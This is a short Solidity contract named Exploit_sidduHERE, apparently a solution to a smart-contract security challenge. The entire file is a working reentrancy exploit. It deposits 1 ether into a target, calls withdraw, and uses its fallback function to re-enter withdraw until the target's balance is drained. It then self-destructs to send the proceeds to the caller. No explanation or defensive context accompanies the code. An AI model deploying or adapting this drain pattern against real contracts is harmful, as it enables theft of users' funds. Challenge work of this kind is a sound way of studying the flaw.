// SPDX-License-Identifier: None
pragma solidity 0.8.11;

interface IChallenge_sidduHERE {
    function deposit() external payable;

    function withdraw() external;
}

contract Exploit_sidduHERE {
    IChallenge_sidduHERE instance;

    constructor(IChallenge_sidduHERE _instance) {
        instance = _instance;
    }

    function finalize() external payable {
        instance.deposit{value: 1 ether}();
        instance.withdraw();

        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {
        if (address(instance).balance > 0) {
            instance.withdraw();
        }
    }
}
